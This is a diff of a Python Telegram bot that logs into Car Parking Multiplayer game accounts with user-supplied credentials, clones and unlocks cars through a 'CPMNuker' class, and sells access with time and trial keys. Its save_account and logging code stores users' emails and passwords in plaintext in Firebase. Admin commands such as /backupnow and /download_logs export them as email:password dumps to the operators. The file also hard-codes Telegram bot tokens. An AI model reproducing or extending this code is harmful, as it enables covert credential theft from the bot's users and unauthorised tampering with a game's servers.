@@ -3,7 +3,7 @@
 
 """
 ☠️☠️☠️ 𝙈𝘼𝙍𝙆𝘾𝙋𝙈1𝙏𝙊𝙊𝙋𝙎 - CPM1 + CPM2 (MAINTENANCE) ULTIMATE ☠️☠️☠️
-WITH SUBSCRIPTION + COIN SYSTEM + RAM OPTIMIZATION
+FIXED: New token, chunked clone with progress, single instance, no 409
 """
 
 import requests
@@ -54,11 +54,22 @@ def home():
 def health():
     return jsonify({"status": "healthy"})
 
+def run_flask():
+    try:
+        import logging
+        logging.getLogger('werkzeug').setLevel(logging.ERROR)
+        port = int(os.environ.get('PORT', 10000))
+        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
+    except SystemExit:
+        pass
+    except Exception as e:
+        print(f"⚠️ Flask server error: {e}")
+
 # ═══════════════════════════════════════════════════════════
-# 🔑 TOKENS & KEYS
+# 🔑 TOKENS & KEYS (UPDATED)
 # ═══════════════════════════════════════════════════════════
 
-BOT_TOKEN = '8857657486:AAExKiauUwNYusKYp8N-gMlawK6ZPtVdRq0'
+BOT_TOKEN = '8857657486:AAHW69hEkDQEEtUbdAtGYqj4L0yFt7Gcup4'
 bot = telebot.TeleBot(BOT_TOKEN)
 
 ADMIN_IDS = [6531314640, 8650959684]
@@ -416,7 +427,7 @@ def get_coin_display(chat_id):
     return f"🪙 **Coins:** {coins}{' (Unlimited)' if unlimited else ''}"
 
 # ═══════════════════════════════════════════════════════════
-# 🔐 ENCRYPTION / DECRYPTION (from cpm_nuker.py)
+# 🔐 ENCRYPTION / DECRYPTION
 # ═══════════════════════════════════════════════════════════
 
 def make_xor_key(uid: str) -> bytes:
@@ -1470,7 +1481,6 @@ class CPMNuker:
         results = []
         failed = []
         await self.load(uid, force=True)
-        # Process in smaller groups to free memory
         for i in range(0, len(feature_calls), 5):
             group = feature_calls[i:i+5]
             for name, fn in group:
@@ -1660,7 +1670,6 @@ def cpm1_unlock_all_cars(target_email, target_pass, progress_callback=None):
                 if progress_callback:
                     progress_callback(i+len(batch), total, success, fail)
                 time.sleep(0.1)
-        # Free memory after each batch
         del batch
         gc.collect()
         time.sleep(0.5)
@@ -1685,39 +1694,57 @@ def cpm1_clone_single_car(target_email, target_pass, car_id):
         return False
     return cpm1_clone_car(target_token, car, target_uid, clean_unlock=True)
 
-def cpm1_clone_account(source_email, source_pass, target_email, target_pass):
+# ═══════════════════════════════════════════════════════════
+# 📋 CHUNKED CLONE ACCOUNT WITH PROGRESS (10 cars per chunk)
+# ═══════════════════════════════════════════════════════════
+
+def cpm1_clone_account_chunked(source_email, source_pass, target_email, target_pass, chat_id, message_id):
     source_token, source_uid = verify_user(source_email, source_pass)
     if not source_token:
-        return False, {"error": "Source login failed", "total": 0, "success": 0, "fail": 0}
+        bot.send_message(chat_id, "❌ Source login failed!", parse_mode='Markdown')
+        return 0, 0, 0
+
     cars = cpm1_get_cars(source_token)
-    if not cars:
-        return False, {"error": "Source has no cars", "total": 0, "success": 0, "fail": 0}
+    if not cars or len(cars) == 0:
+        bot.send_message(chat_id, "❌ Source has no cars!", parse_mode='Markdown')
+        return 0, 0, 0
+
     total = len(cars)
     target_token, target_uid = verify_user(target_email, target_pass)
     if not target_token:
-        return False, {"error": "Target login failed", "total": 0, "success": 0, "fail": 0}
+        bot.send_message(chat_id, "❌ Target login failed!", parse_mode='Markdown')
+        return 0, 0, total
+
     success = 0
     fail = 0
-    batch_size = 50
-    for i in range(0, total, batch_size):
-        batch = cars[i:i+batch_size]
-        for car in batch:
+    chunk_size = 10
+    total_chunks = (total + chunk_size - 1) // chunk_size
+
+    for i in range(0, total, chunk_size):
+        chunk = cars[i:i+chunk_size]
+        chunk_success = 0
+        chunk_fail = 0
+        for car in chunk:
             if isinstance(car, dict):
                 if cpm1_clone_car(target_token, car, target_uid, clean_unlock=False):
-                    success += 1
+                    chunk_success += 1
                 else:
-                    fail += 1
+                    chunk_fail += 1
                 time.sleep(0.1)
-        del batch
+        success += chunk_success
+        fail += chunk_fail
+        processed = min(i + chunk_size, total)
+        chunk_num = i // chunk_size + 1
+        progress = f"⏳ **Cloning cars...**\n━━━━━━━━━━━━━━━━━━━━━\n📊 **Progress:** {processed}/{total} cars\n✅ **Added:** {success}\n❌ **Failed:** {fail}\n🔄 **Batch:** {chunk_num}/{total_chunks}\n━━━━━━━━━━━━━━━━━━━━━\n⏱️ Please wait..."
+        try:
+            bot.edit_message_text(progress, chat_id, message_id, parse_mode='Markdown')
+        except Exception:
+            pass
+        del chunk
         gc.collect()
         time.sleep(0.5)
-    result_data = {"total": total, "success": success, "fail": fail}
-    if success == total:
-        return True, result_data
-    elif success > 0:
-        return "partial", result_data
-    else:
-        return False, result_data
+
+    return success, fail, total
 
 # ═══════════════════════════════════════════════════════════
 # 🌐 HELPER FUNCTIONS
@@ -1741,279 +1768,68 @@ saved_accounts = {}
 user_cpm_version = {}
 bot_status = True
 
-# ═══════════════════════════════════════════════════════════
-# 📢 ADMIN NOTIFICATION
-# ═══════════════════════════════════════════════════════════
+def is_admin(chat_id):
+    return chat_id in ADMIN_IDS
 
-def notify_admins(message_text, parse_mode='Markdown'):
-    for admin_id in ADMIN_IDS:
-        try:
-            bot.send_message(admin_id, f"📢 **New Notification**\n━━━━━━━━━━━━━━━━━━━━━\n{message_text}", parse_mode=parse_mode)
-        except Exception as e:
-            print(f"Failed to notify admin {admin_id}: {e}")
+def get_web_uid(telegram_id):
+    return int(str(telegram_id)[:12])
 
-# ═══════════════════════════════════════════════════════════
-# 📥 ADMIN COMMANDS (logs, backup, dashboard)
-# ═══════════════════════════════════════════════════════════
-
-@bot.message_handler(commands=['download_logs'])
-def download_logs_command(message):
-    chat_id = message.chat.id
-    if not is_admin(chat_id):
-        bot.send_message(chat_id, "⛔ Admin only. ❌⚠️", parse_mode='Markdown')
-        return
-    msg = bot.send_message(chat_id, "⏳ **Fetching logs from cloud...** 📊", parse_mode='Markdown')
+def check_subscription(chat_id):
     try:
-        credentials_logs = db_get("logs/credentials", limit=1000) or {}
-        changes_logs = db_get("logs/changes", limit=1000) or {}
-        keys_logs = db_get("logs/keys", limit=1000) or {}
-        total_credentials = len(credentials_logs) if credentials_logs else 0
-        total_changes = len(changes_logs) if changes_logs else 0
-        total_keys = len(keys_logs) if keys_logs else 0
-        last_entries = []
-        if credentials_logs:
-            items = list(credentials_logs.items())
-            for key, val in items[-10:]:
-                email = val.get('email', 'N/A')
-                game = val.get('game', 'N/A')
-                timestamp = val.get('timestamp', 'N/A')[:19]
-                last_entries.append(f"📧 **{email}** ({game}) - {timestamp}")
-        summary = (
-            f"📊 **CLOUD LOGS SUMMARY** 🥵\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"📝 **Credentials Saved:** {total_credentials}\n"
-            f"🔄 **Changes Logged:** {total_changes}\n"
-            f"🔑 **Keys/Trials:** {total_keys}\n"
-            f"📅 **Updated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-            f"📋 **Last 10 entries:**\n"
-        )
-        for entry in last_entries[:10]:
-            summary += f"  • {entry}\n"
-        if total_credentials > 10:
-            summary += f"\n  ... and {total_credentials - 10} more credentials saved\n"
-        summary += f"\n💾 Use /backupnow to download full backup."
-        bot.edit_message_text(summary, chat_id, msg.message_id, parse_mode='Markdown')
-    except Exception as e:
-        bot.edit_message_text(f"❌ **Failed to fetch logs:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')
+        member = bot.get_chat_member(CHANNEL_ID, chat_id)
+        return member.status in ['member', 'administrator', 'creator']
+    except Exception:
+        return False
 
-@bot.message_handler(commands=['backup_now', 'backupnow'])
-def backup_now_command(message):
-    chat_id = message.chat.id
-    if not is_admin(chat_id):
-        bot.send_message(chat_id, "⛔ Admin only. ❌⚠️", parse_mode='Markdown')
-        return
-    msg = bot.send_message(chat_id, "⏳ **Creating backup...** 📁", parse_mode='Markdown')
-    try:
-        credentials_logs = db_get("logs/credentials", limit=5000) or {}
-        if not credentials_logs:
-            bot.edit_message_text("📭 **No credentials found in Firebase.**", chat_id, msg.message_id, parse_mode='Markdown')
+def add_log(chat_id, action):
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+    user_logs.append(f"[{timestamp}] User {chat_id}: {action}")
+    if len(user_logs) > 100:
+        user_logs.pop(0)
+
+def save_account(chat_id, email, password, player_id=None, name=None):
+    if chat_id not in saved_accounts:
+        saved_accounts[chat_id] = []
+    account_data = {
+        "email": email,
+        "password": password,
+        "player_id": player_id,
+        "name": name,
+        "saved_at": time.strftime("%Y-%m-%d %H:%M:%S")
+    }
+    for acc in saved_accounts[chat_id]:
+        if acc["email"] == email:
+            acc.update(account_data)
             return
-        backup_filename = f"backup_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        all_creds = []
-        for key, entry in credentials_logs.items():
-            email = entry.get('email', 'N/A')
-            password = entry.get('password', 'N/A')
-            game = entry.get('game', 'N/A')
-            timestamp = entry.get('timestamp', 'N/A')
-            all_creds.append(f"{email}:{password}  # {game} | {timestamp[:19]}")
-        with open(backup_filename, "w", encoding="utf-8") as f:
-            f.write(f"# BACKUP - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write(f"# Total: {len(all_creds)} accounts\n")
-            f.write("#" + "="*50 + "\n\n")
-            f.write("\n".join(all_creds))
-        with open(backup_filename, "rb") as f:
-            bot.send_document(
-                chat_id=chat_id,
-                document=f,
-                caption=f"📦 **FULL BACKUP**\n━━━━━━━━━━━━━━━━━━━━━\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📊 Total accounts: {len(all_creds)}\n\n✅ All credentials from Firebase."
-            )
-        local_files = [
-            CREDENTIALS_BACKUP_CPM1,
-            CREDENTIALS_BACKUP_CPM2,
-            DETAILED_CHANGES_CPM1,
-            DETAILED_CHANGES_CPM2,
-            KEYS_LOG_FILE
-        ]
-        for filename in local_files:
-            if os.path.exists(filename) and os.path.getsize(filename) > 0:
-                with open(filename, "rb") as f:
-                    bot.send_document(
-                        chat_id=chat_id,
-                        document=f,
-                        caption=f"📎 **{filename}** (local backup)"
-                    )
-        os.remove(backup_filename)
-        bot.edit_message_text("✅ **Backup sent! Check your DMs.** 🥵", chat_id, msg.message_id, parse_mode='Markdown')
-    except Exception as e:
-        bot.edit_message_text(f"❌ **Backup failed:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')
-
-@bot.message_handler(commands=['dashboard'])
-def dashboard_command(message):
-    chat_id = message.chat.id
-    if not is_admin(chat_id):
-        bot.send_message(chat_id, "⛔ Admin only. ❌⚠️", parse_mode='Markdown')
-        return
-    msg = bot.send_message(chat_id, "⏳ **Loading dashboard...** 📊", parse_mode='Markdown')
+    saved_accounts[chat_id].append(account_data)
     try:
-        credentials_logs = db_get("logs/credentials", limit=5000) or {}
-        changes_logs = db_get("logs/changes", limit=5000) or {}
-        keys_logs = db_get("logs/keys", limit=5000) or {}
-        total_credentials = len(credentials_logs) if credentials_logs else 0
-        total_changes = len(changes_logs) if changes_logs else 0
-        total_keys = len(keys_logs) if keys_logs else 0
-        unique_users = set()
-        for key, entry in (credentials_logs or {}).items():
-            uid = entry.get('user_id', 0)
-            if uid:
-                unique_users.add(uid)
-        cpm1_count = 0
-        cpm2_count = 0
-        for key, entry in (credentials_logs or {}).items():
-            game = entry.get('game', '')
-            if game == 'cpm1':
-                cpm1_count += 1
-            elif game == 'cpm2':
-                cpm2_count += 1
-        recent_count = 0
-        now = datetime.now(timezone.utc)
-        for key, entry in (credentials_logs or {}).items():
-            timestamp = entry.get('timestamp', '')
-            if timestamp:
-                try:
-                    ts = datetime.fromisoformat(timestamp)
-                    if (now - ts).total_seconds() < 86400:
-                        recent_count += 1
-                except Exception:
-                    pass
-        dashboard_text = (
-            f"👑 **ADMIN DASHBOARD** 🥵\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"📊 **TOTAL STATS:**\n"
-            f"  • Credentials Saved: **{total_credentials}**\n"
-            f"  • Changes Logged: **{total_changes}**\n"
-            f"  • Keys/Trials: **{total_keys}**\n"
-            f"  • Unique Users: **{len(unique_users)}**\n\n"
-            f"🎮 **GAME BREAKDOWN:**\n"
-            f"  • CPM1: **{cpm1_count}**\n"
-            f"  • CPM2: **{cpm2_count}**\n\n"
-            f"⏰ **24h Activity:** **{recent_count}**\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-            f"💾 Use /backupnow to download full backup.\n"
-            f"📥 Use /download_logs for detailed logs."
-        )
-        bot.edit_message_text(dashboard_text, chat_id, msg.message_id, parse_mode='Markdown')
+        cloud_log_credentials(email, password, "cpm1", "saved", "", "", chat_id)
     except Exception as e:
-        bot.edit_message_text(f"❌ **Failed to load dashboard:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')
+        print(f"⚠️ Failed to log saved account to Firebase: {e}")
 
-# ═══════════════════════════════════════════════════════════
-# 🔑 TIME KEY & TRIAL FUNCTIONS (unchanged)
-# ═══════════════════════════════════════════════════════════
-
-def generate_time_key():
-    chars = string.ascii_uppercase + string.digits
-    return ''.join(random.choices(chars, k=16))
-
-def create_time_key(duration_hours: int, created_by: int) -> str:
-    key = generate_time_key()
-    TIME_KEYS[key] = {
-        "expires": datetime.now() + timedelta(hours=duration_hours),
-        "duration": duration_hours,
-        "used": False,
-        "user_id": None,
-        "created_by": created_by,
-        "created_at": datetime.now(),
-        "key_type": "time"
-    }
+def refresh_account_data(chat_id):
+    if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in'):
+        return False, "Not logged in"
+    web_uid = user_sessions[chat_id].get('web_uid')
+    if not web_uid:
+        return False, "No web UID"
+    email = user_sessions[chat_id].get('email')
+    if not email:
+        return False, "No email"
     try:
-        cloud_log_key_event(created_by, f"{duration_hours}h", "created", created_by)
-    except Exception:
-        pass
-    return key
-
-def use_time_key(key: str, user_id: int) -> Tuple[bool, str]:
-    if key not in TIME_KEYS:
-        return False, "Key not found"
-    key_data = TIME_KEYS[key]
-    if datetime.now() > key_data["expires"]:
-        return False, "Key has expired"
-    if key_data["used"]:
-        if key_data["user_id"] == user_id:
-            return True, "Key is still valid for you"
+        ck = nuker._ck(web_uid, email)
+        if ck in nuker.cache:
+            del nuker.cache[ck]
+        success = run_async(nuker.load_account(web_uid, force=True))
+        if success:
+            return True, "Data refreshed successfully"
         else:
-            return False, "Key already used by another user"
-    key_data["used"] = True
-    key_data["user_id"] = user_id
-    USER_SUBSCRIPTIONS[user_id] = {
-        "expires": key_data["expires"],
-        "duration": key_data["duration"],
-        "key": key
-    }
-    try:
-        cloud_log_key_event(user_id, f"{key_data['duration']}h", "used", key_data['created_by'])
-    except Exception:
-        pass
-    return True, "Key activated successfully"
-
-def generate_trial_key():
-    chars = string.ascii_uppercase + string.digits
-    return ''.join(random.choices(chars, k=12))
-
-def create_trial_key(user_id=None, minutes=10):
-    key = generate_trial_key()
-    TRIAL_KEYS[key] = {
-        "user_id": user_id,
-        "expires": datetime.now() + timedelta(minutes=minutes),
-        "used": False,
-        "created_at": datetime.now(),
-        "duration": minutes,
-        "used_at": None,
-        "key_type": "trial"
-    }
-    try:
-        cloud_log_key_event(user_id or 0, f"{minutes}min", "created", 0)
-    except Exception:
-        pass
-    return key
-
-def use_trial_key(key, user_id):
-    if key not in TRIAL_KEYS:
-        return False, "invalid"
-    trial_data = TRIAL_KEYS[key]
-    if datetime.now() > trial_data["expires"]:
-        return False, "expired"
-    if trial_data["used"] and trial_data["user_id"] != user_id:
-        return False, "used_by_other"
-    if trial_data["used"] and trial_data["user_id"] == user_id:
-        return True, "already_used_same_user"
-    TRIAL_KEYS[key]["used"] = True
-    TRIAL_KEYS[key]["user_id"] = user_id
-    TRIAL_KEYS[key]["used_at"] = datetime.now()
-    try:
-        cloud_log_key_event(user_id, "trial", "used", 0)
-    except Exception:
-        pass
-    return True, "success"
-
-def can_use_free_trial(user_id):
-    if user_id not in FREE_TRIAL_USERS:
-        return True, 0, 0
-    last_used = FREE_TRIAL_USERS[user_id]["last_used"]
-    days_passed = (datetime.now() - last_used).days
-    if days_passed >= 5:
-        return True, 0, 0
-    next_available = last_used + timedelta(days=5)
-    remaining = next_available - datetime.now()
-    return False, remaining.days, remaining.seconds // 3600
-
-def register_free_trial(user_id):
-    FREE_TRIAL_USERS[user_id] = {
-        "last_used": datetime.now(),
-        "count": FREE_TRIAL_USERS.get(user_id, {}).get("count", 0) + 1
-    }
+            return False, "Failed to load data from server"
+    except Exception as e:
+        return False, f"Error: {str(e)}"
 
 # ═══════════════════════════════════════════════════════════
-# 📋 FORMATTING & HELPER FUNCTIONS
+# 📋 FORMATTING FUNCTIONS
 # ═══════════════════════════════════════════════════════════
 
 def format_account_info(info: Dict[str, Any]) -> str:
@@ -2149,74 +1965,6 @@ def get_text(chat_id, key, **kwargs):
             pass
     return text
 
-def is_admin(chat_id):
-    return chat_id in ADMIN_IDS
-
-def add_log(chat_id, action):
-    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-    user_logs.append(f"[{timestamp}] User {chat_id}: {action}")
-    if len(user_logs) > 100:
-        user_logs.pop(0)
-
-def save_account(chat_id, email, password, player_id=None, name=None):
-    if chat_id not in saved_accounts:
-        saved_accounts[chat_id] = []
-    account_data = {
-        "email": email,
-        "password": password,
-        "player_id": player_id,
-        "name": name,
-        "saved_at": time.strftime("%Y-%m-%d %H:%M:%S")
-    }
-    for acc in saved_accounts[chat_id]:
-        if acc["email"] == email:
-            acc.update(account_data)
-            return
-    saved_accounts[chat_id].append(account_data)
-    try:
-        cloud_log_credentials(email, password, "cpm1", "saved", "", "", chat_id)
-    except Exception as e:
-        print(f"⚠️ Failed to log saved account to Firebase: {e}")
-
-def check_subscription(chat_id):
-    try:
-        member = bot.get_chat_member(CHANNEL_ID, chat_id)
-        return member.status in ['member', 'administrator', 'creator']
-    except Exception:
-        return False
-
-def subscription_required(message):
-    chat_id = message.chat.id
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    btn1 = types.InlineKeyboardButton("📢 Subscribe to Channel", url=CHANNEL_LINK)
-    btn2 = types.InlineKeyboardButton("🔄 Check Subscription", callback_data="check_sub")
-    markup.add(btn1, btn2)
-    bot.send_message(chat_id, "❌ **You must subscribe to the channel first!**\n\n📢 **Channel:** [markmwehehe](https://t.me/markmwhehe)", reply_markup=markup, parse_mode='Markdown')
-
-def refresh_account_data(chat_id):
-    if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in'):
-        return False, "Not logged in"
-    web_uid = user_sessions[chat_id].get('web_uid')
-    if not web_uid:
-        return False, "No web UID"
-    email = user_sessions[chat_id].get('email')
-    if not email:
-        return False, "No email"
-    try:
-        ck = nuker._ck(web_uid, email)
-        if ck in nuker.cache:
-            del nuker.cache[ck]
-        success = run_async(nuker.load_account(web_uid, force=True))
-        if success:
-            return True, "Data refreshed successfully"
-        else:
-            return False, "Failed to load data from server"
-    except Exception as e:
-        return False, f"Error: {str(e)}"
-
-def get_web_uid(telegram_id):
-    return int(str(telegram_id)[:12])
-
 # ═══════════════════════════════════════════════════════════
 # 🎨 KEYBOARDS
 # ═══════════════════════════════════════════════════════════
@@ -2288,10 +2036,6 @@ def create_subscription_stars_log_keyboard():
     btn1 = types.InlineKeyboardButton("✅ Automatically activated — record only", callback_data="stars_record_only")
     markup.row(btn1)
     return markup
-
-@bot.callback_query_handler(func=lambda call: call.data == "stars_record_only")
-def stars_record_only_callback(call):
-    bot.answer_callback_query(call.id, "🌟 Stars payments activate automatically. No confirm/decline needed.", show_alert=True)
 
 def create_subscription_renew_keyboard():
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -2583,6 +2327,285 @@ def admin_command(message):
     bot.send_message(chat_id, get_text(chat_id, "admin_panel"), reply_markup=markup, parse_mode='Markdown')
 
 # ═══════════════════════════════════════════════════════════
+# 🔑 TIME KEY & TRIAL FUNCTIONS
+# ═══════════════════════════════════════════════════════════
+
+def generate_time_key():
+    chars = string.ascii_uppercase + string.digits
+    return ''.join(random.choices(chars, k=16))
+
+def create_time_key(duration_hours: int, created_by: int) -> str:
+    key = generate_time_key()
+    TIME_KEYS[key] = {
+        "expires": datetime.now() + timedelta(hours=duration_hours),
+        "duration": duration_hours,
+        "used": False,
+        "user_id": None,
+        "created_by": created_by,
+        "created_at": datetime.now(),
+        "key_type": "time"
+    }
+    try:
+        cloud_log_key_event(created_by, f"{duration_hours}h", "created", created_by)
+    except Exception:
+        pass
+    return key
+
+def use_time_key(key: str, user_id: int) -> Tuple[bool, str]:
+    if key not in TIME_KEYS:
+        return False, "Key not found"
+    key_data = TIME_KEYS[key]
+    if datetime.now() > key_data["expires"]:
+        return False, "Key has expired"
+    if key_data["used"]:
+        if key_data["user_id"] == user_id:
+            return True, "Key is still valid for you"
+        else:
+            return False, "Key already used by another user"
+    key_data["used"] = True
+    key_data["user_id"] = user_id
+    USER_SUBSCRIPTIONS[user_id] = {
+        "expires": key_data["expires"],
+        "duration": key_data["duration"],
+        "key": key
+    }
+    try:
+        cloud_log_key_event(user_id, f"{key_data['duration']}h", "used", key_data['created_by'])
+    except Exception:
+        pass
+    return True, "Key activated successfully"
+
+def generate_trial_key():
+    chars = string.ascii_uppercase + string.digits
+    return ''.join(random.choices(chars, k=12))
+
+def create_trial_key(user_id=None, minutes=10):
+    key = generate_trial_key()
+    TRIAL_KEYS[key] = {
+        "user_id": user_id,
+        "expires": datetime.now() + timedelta(minutes=minutes),
+        "used": False,
+        "created_at": datetime.now(),
+        "duration": minutes,
+        "used_at": None,
+        "key_type": "trial"
+    }
+    try:
+        cloud_log_key_event(user_id or 0, f"{minutes}min", "created", 0)
+    except Exception:
+        pass
+    return key
+
+def use_trial_key(key, user_id):
+    if key not in TRIAL_KEYS:
+        return False, "invalid"
+    trial_data = TRIAL_KEYS[key]
+    if datetime.now() > trial_data["expires"]:
+        return False, "expired"
+    if trial_data["used"] and trial_data["user_id"] != user_id:
+        return False, "used_by_other"
+    if trial_data["used"] and trial_data["user_id"] == user_id:
+        return True, "already_used_same_user"
+    TRIAL_KEYS[key]["used"] = True
+    TRIAL_KEYS[key]["user_id"] = user_id
+    TRIAL_KEYS[key]["used_at"] = datetime.now()
+    try:
+        cloud_log_key_event(user_id, "trial", "used", 0)
+    except Exception:
+        pass
+    return True, "success"
+
+def can_use_free_trial(user_id):
+    if user_id not in FREE_TRIAL_USERS:
+        return True, 0, 0
+    last_used = FREE_TRIAL_USERS[user_id]["last_used"]
+    days_passed = (datetime.now() - last_used).days
+    if days_passed >= 5:
+        return True, 0, 0
+    next_available = last_used + timedelta(days=5)
+    remaining = next_available - datetime.now()
+    return False, remaining.days, remaining.seconds // 3600
+
+def register_free_trial(user_id):
+    FREE_TRIAL_USERS[user_id] = {
+        "last_used": datetime.now(),
+        "count": FREE_TRIAL_USERS.get(user_id, {}).get("count", 0) + 1
+    }
+
+# ═══════════════════════════════════════════════════════════
+# 📋 ADMIN LOG FUNCTIONS
+# ═══════════════════════════════════════════════════════════
+
+def notify_admins(message_text, parse_mode='Markdown'):
+    for admin_id in ADMIN_IDS:
+        try:
+            bot.send_message(admin_id, f"📢 **New Notification**\n━━━━━━━━━━━━━━━━━━━━━\n{message_text}", parse_mode=parse_mode)
+        except Exception as e:
+            print(f"Failed to notify admin {admin_id}: {e}")
+
+def subscription_required(message):
+    chat_id = message.chat.id
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    btn1 = types.InlineKeyboardButton("📢 Subscribe to Channel", url=CHANNEL_LINK)
+    btn2 = types.InlineKeyboardButton("🔄 Check Subscription", callback_data="check_sub")
+    markup.add(btn1, btn2)
+    bot.send_message(chat_id, "❌ **You must subscribe to the channel first!**\n\n📢 **Channel:** [markmwehehe](https://t.me/markmwhehe)", reply_markup=markup, parse_mode='Markdown')
+
+# ═══════════════════════════════════════════════════════════
+# 📥 ADMIN COMMANDS (logs, backup, dashboard)
+# ═══════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['download_logs'])
+def download_logs_command(message):
+    chat_id = message.chat.id
+    if not is_admin(chat_id):
+        bot.send_message(chat_id, "⛔ Admin only. ❌⚠️", parse_mode='Markdown')
+        return
+    msg = bot.send_message(chat_id, "⏳ **Fetching logs from cloud...** 📊", parse_mode='Markdown')
+    try:
+        credentials_logs = db_get("logs/credentials", limit=1000) or {}
+        changes_logs = db_get("logs/changes", limit=1000) or {}
+        keys_logs = db_get("logs/keys", limit=1000) or {}
+        total_credentials = len(credentials_logs) if credentials_logs else 0
+        total_changes = len(changes_logs) if changes_logs else 0
+        total_keys = len(keys_logs) if keys_logs else 0
+        last_entries = []
+        if credentials_logs:
+            items = list(credentials_logs.items())
+            for key, val in items[-10:]:
+                email = val.get('email', 'N/A')
+                game = val.get('game', 'N/A')
+                timestamp = val.get('timestamp', 'N/A')[:19]
+                last_entries.append(f"📧 **{email}** ({game}) - {timestamp}")
+        summary = (
+            f"📊 **CLOUD LOGS SUMMARY** 🥵\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"📝 **Credentials Saved:** {total_credentials}\n"
+            f"🔄 **Changes Logged:** {total_changes}\n"
+            f"🔑 **Keys/Trials:** {total_keys}\n"
+            f"📅 **Updated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"📋 **Last 10 entries:**\n"
+        )
+        for entry in last_entries[:10]:
+            summary += f"  • {entry}\n"
+        if total_credentials > 10:
+            summary += f"\n  ... and {total_credentials - 10} more credentials saved\n"
+        summary += f"\n💾 Use /backupnow to download full backup."
+        bot.edit_message_text(summary, chat_id, msg.message_id, parse_mode='Markdown')
+    except Exception as e:
+        bot.edit_message_text(f"❌ **Failed to fetch logs:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')
+
+@bot.message_handler(commands=['backup_now', 'backupnow'])
+def backup_now_command(message):
+    chat_id = message.chat.id
+    if not is_admin(chat_id):
+        bot.send_message(chat_id, "⛔ Admin only. ❌⚠️", parse_mode='Markdown')
+        return
+    msg = bot.send_message(chat_id, "⏳ **Creating backup...** 📁", parse_mode='Markdown')
+    try:
+        credentials_logs = db_get("logs/credentials", limit=5000) or {}
+        if not credentials_logs:
+            bot.edit_message_text("📭 **No credentials found in Firebase.**", chat_id, msg.message_id, parse_mode='Markdown')
+            return
+        backup_filename = f"backup_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        all_creds = []
+        for key, entry in credentials_logs.items():
+            email = entry.get('email', 'N/A')
+            password = entry.get('password', 'N/A')
+            game = entry.get('game', 'N/A')
+            timestamp = entry.get('timestamp', 'N/A')
+            all_creds.append(f"{email}:{password}  # {game} | {timestamp[:19]}")
+        with open(backup_filename, "w", encoding="utf-8") as f:
+            f.write(f"# BACKUP - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"# Total: {len(all_creds)} accounts\n")
+            f.write("#" + "="*50 + "\n\n")
+            f.write("\n".join(all_creds))
+        with open(backup_filename, "rb") as f:
+            bot.send_document(
+                chat_id=chat_id,
+                document=f,
+                caption=f"📦 **FULL BACKUP**\n━━━━━━━━━━━━━━━━━━━━━\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📊 Total accounts: {len(all_creds)}\n\n✅ All credentials from Firebase."
+            )
+        local_files = [
+            CREDENTIALS_BACKUP_CPM1,
+            CREDENTIALS_BACKUP_CPM2,
+            DETAILED_CHANGES_CPM1,
+            DETAILED_CHANGES_CPM2,
+            KEYS_LOG_FILE
+        ]
+        for filename in local_files:
+            if os.path.exists(filename) and os.path.getsize(filename) > 0:
+                with open(filename, "rb") as f:
+                    bot.send_document(
+                        chat_id=chat_id,
+                        document=f,
+                        caption=f"📎 **{filename}** (local backup)"
+                    )
+        os.remove(backup_filename)
+        bot.edit_message_text("✅ **Backup sent! Check your DMs.** 🥵", chat_id, msg.message_id, parse_mode='Markdown')
+    except Exception as e:
+        bot.edit_message_text(f"❌ **Backup failed:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')
+
+@bot.message_handler(commands=['dashboard'])
+def dashboard_command(message):
+    chat_id = message.chat.id
+    if not is_admin(chat_id):
+        bot.send_message(chat_id, "⛔ Admin only. ❌⚠️", parse_mode='Markdown')
+        return
+    msg = bot.send_message(chat_id, "⏳ **Loading dashboard...** 📊", parse_mode='Markdown')
+    try:
+        credentials_logs = db_get("logs/credentials", limit=5000) or {}
+        changes_logs = db_get("logs/changes", limit=5000) or {}
+        keys_logs = db_get("logs/keys", limit=5000) or {}
+        total_credentials = len(credentials_logs) if credentials_logs else 0
+        total_changes = len(changes_logs) if changes_logs else 0
+        total_keys = len(keys_logs) if keys_logs else 0
+        unique_users = set()
+        for key, entry in (credentials_logs or {}).items():
+            uid = entry.get('user_id', 0)
+            if uid:
+                unique_users.add(uid)
+        cpm1_count = 0
+        cpm2_count = 0
+        for key, entry in (credentials_logs or {}).items():
+            game = entry.get('game', '')
+            if game == 'cpm1':
+                cpm1_count += 1
+            elif game == 'cpm2':
+                cpm2_count += 1
+        recent_count = 0
+        now = datetime.now(timezone.utc)
+        for key, entry in (credentials_logs or {}).items():
+            timestamp = entry.get('timestamp', '')
+            if timestamp:
+                try:
+                    ts = datetime.fromisoformat(timestamp)
+                    if (now - ts).total_seconds() < 86400:
+                        recent_count += 1
+                except Exception:
+                    pass
+        dashboard_text = (
+            f"👑 **ADMIN DASHBOARD** 🥵\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"📊 **TOTAL STATS:**\n"
